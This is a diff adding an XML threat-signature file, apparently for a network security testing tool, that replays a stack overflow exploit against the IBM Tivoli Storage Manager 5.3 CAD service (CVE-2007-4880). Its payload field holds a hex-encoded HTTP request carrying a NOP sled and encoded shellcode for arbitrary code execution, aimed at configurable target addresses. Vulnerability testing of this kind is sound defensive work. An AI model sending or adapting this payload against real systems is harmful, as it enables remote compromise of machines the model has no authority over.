@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Tivoli Storage Manager 5.3 Express CAD Service Vulnerability"/>
+    <EngDesc display="true" value="This threat demonstrates a stack overflow in IBM's Tivoli Storage Manager, that results in execution of arbitrary code."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_Tivoli_Storage_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IBM_Tivoli_Storage_Manager_5.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/4573"/>
+    <CVEID display="true" value="CVE-2007-4880"/>
+    <bugtraqID display="true" value="25743"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="bb9cbe0b33949ff9ad9b39145721a493"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633293083593493548"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1195559515" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="CADdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$CADdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F4241434C49454E5420485454502F312E300D0A486F73743A203139322E3136382E312E31204269726473666C79696E6768696768796F756B6E6F77686F77496665656C53756E696E746865736B79796F756B6E6F77686F77496665656C5265656564736472696674696E6F6E6279796F756B6E6F77686F77496665656C497473616E65776461776E497473616E6577646179497473616E65776C696665466F726D65497473616E65776461776E497473616E6577646179497473616E65776C696665466F726D65697473616E65776461776E697473616E6577646179666F726D653807D27790909090EB0359EB05E8F8FFFFFF494949493749494949494949494949494949515A6A61585030413142416B414171413241413242413042415850384142756869496C317A686B626D49784B49396F6B4F396F33504E6B524C346474646E6B4265674C6C4B416C4665425857717A4F6C4B504F65484E6B714F51303771586B77394E6B75644C4B53315A4E44714B706F696E4C6C446950425445574F317A6A366D54416B72786B6964474B50543644646843454A456E6B414F56446551486B75366C4B644C504B6E6B714F776C3441486B5333664C6E6B4B39306C3644654C51714F335741394B71744C4B504376504E6B4150544C6E6B3250454C4C6D6E6B47303668736E32486C4E304E566E5A4C56306B4F4B667176627331764538747376527178634763437652314F4144796F4E306538584B486D4B4C756B72706B4F7A76714F6F796D3551766C41586D655857727365735A4442496F6E3031784E3964496A554E4D5367796F6E364143314346337363427330434143326370534B4F3850435671787451336C317670534E695A414D4541784C64354A30706B7752776B4F6E36624A345072717635696F4E3045386E444C6D464E4D394637596F4B6630536275496F385063586B5537394E66715941476B4F5A7670505144314470556B4F68506E737178597770795A66716966376B4F6A7652754B4F5A707176317A5534317672485063724D6F797865535A727072797649784C4B394D37535A32646D596A4237416B704B434F5A496E6372564D496E3042646C6D436C4D625A75686C6B6E4B6E4B50684342496E6C736236696F743530446B4F4856536B70577362714170517631635A57714271663172757141496F685075384C6D794974455A6E32734B4F6E36724A6B4F6B4F5037796F4E306E6B4637696C4F7369545244496F4B6643626B4F5A7051787A504F7A7664314F33634B4F4856496F4850610D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <Stateful display="false" value="true"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
